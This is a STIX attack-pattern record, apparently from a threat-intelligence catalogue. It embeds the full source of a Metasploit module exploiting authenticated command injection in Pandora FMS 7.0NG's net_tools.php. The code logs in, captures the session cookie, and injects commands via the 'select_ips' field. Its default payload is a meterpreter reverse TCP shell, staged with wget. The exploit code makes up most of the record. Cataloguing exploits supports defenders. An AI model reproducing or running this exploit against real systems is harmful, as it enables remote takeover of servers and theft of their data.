{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--18c8a0ce-1aaa-4bd1-addd-afc715cf5254",
    "created": "2024-08-14T17:02:12.194401Z",
    "modified": "2024-08-14T17:02:12.194405Z",
    "name": "Pandora FMS Ping Authenticated Remote Code Execution",
    "description": " This module exploits a vulnerability found in Pandora FMS 7.0NG and lower. net_tools.php in Pandora FMS 7.0NG allows remote attackers to execute arbitrary OS commands. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/pandora_ping_cmd_exec.rb",
            "external_id": "pandora_ping_cmd_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Pandora FMS Ping Authenticated Remote Code Execution',\n        'Description' => %q{\n          This module exploits a vulnerability found in Pandora FMS 7.0NG and lower.\n          net_tools.php in Pandora FMS 7.0NG allows remote attackers to execute arbitrary OS commands.\n        },\n        'Author' => [\n          'Onur ER <onur@onurer.net>' # Vulnerability discovery and Metasploit module\n        ],\n        'DisclosureDate' => '2020-03-09',\n        'License' => MSF_LICENSE,\n        'Platform' => 'linux',\n        'Arch' => [ARCH_X86, ARCH_X64],\n        'Privileged' => false,\n        'Targets' => [\n          ['Automatic Target', {}]\n        ],\n        'DefaultOptions' => {\n          'Payload' => 'linux/x86/meterpreter/reverse_tcp'\n        },\n        'DefaultTarget' => 0\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The URI of the vulnerable Pandora FMS instance', '/pandora_console/']),\n        OptString.new('USERNAME', [true, 'The username to authenticate with']),\n        OptString.new('PASSWORD', [true, 'The password to authenticate with'])\n      ]\n    )\n  end\n\n  def check\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri, 'index.php')\n    })\n\n    unless res\n      vprint_error 'Connection failed'\n      return CheckCode::Unknown\n    end\n\n    unless res.body =~ /Pandora/i\n      return CheckCode::Safe\n    end\n\n    pandora_version = res.body.scan(%r{<div id=\"ver_num\">v(.*?)</div>}).flatten.first\n    version = Rex::Version.new(pandora_version)\n\n    print_status(\"Pandora FMS version #{version}\") if version\n\n    if Rex::Version.new(version) <= Rex::Version.new('7.0NG')\n      return Exploit::CheckCode::Appears\n    end\n\n    CheckCode::Detected\n  end\n\n  def authenticate\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri, 'index.php'),\n      'vars_get' => {\n        'login' => '1'\n      },\n      'vars_post' => {\n        'nick' => datastore['USERNAME'],\n        'pass' => datastore['PASSWORD'],\n        'login_button' => 'Login'\n      }\n    })\n\n    return auth_succeeded?(res)\n  end\n\n  def auth_succeeded?(res)\n    unless res && res.code == 200 && res.body.include?('Welcome to Pandora FMS')\n      print_error('Authentication failed!')\n      return false\n    end\n    print_good('Successfully authenticated')\n    print_status('Attempting to retrieve session cookie')\n    @cookie = res.get_cookies\n    unless @cookie.include?('PHPSESSID')\n      print_error('Error retrieving cookie!')\n      return false\n    end\n    print_good(\"Successfully retrieved session cookie: #{@cookie}\")\n    true\n  end\n\n  def exploit\n    print_status('Exploiting...')\n    execute_cmdstager(flavor: :wget, nospace: true)\n  end\n\n  def execute_command(cmd, _opts = {})\n    print_status(\"Attempting to authenticate using (#{datastore['USERNAME']}:#{datastore['PASSWORD']})\")\n    auth = authenticate\n    unless auth\n      fail_with Failure::NoAccess, 'Please provide a valid username and password.'\n    end\n\n    id_agente = 1\n    while !session_created? && id_agente <= 10\n      send_request_cgi({\n        'method' => 'POST',\n        'uri' => normalize_uri(target_uri, 'index.php'),\n        'cookie' => @cookie,\n        'vars_get' => {\n          'sec' => 'estado',\n          'sec2' => 'operation/agentes/ver_agente',\n          'tab' => 'extension',\n          'id_agente' => id_agente.to_s,\n          'id_extension' => 'network_tools'\n        },\n        'vars_post' => {\n          'operation' => '2',\n          'select_ips' => \";#{cmd}\",\n          'community' => 'public',\n          'submit' => 'Execute'\n        }\n      })\n\n      id_agente += 1\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-03-09",
    "x_mitre_platforms": [
        "linux'"
    ]
}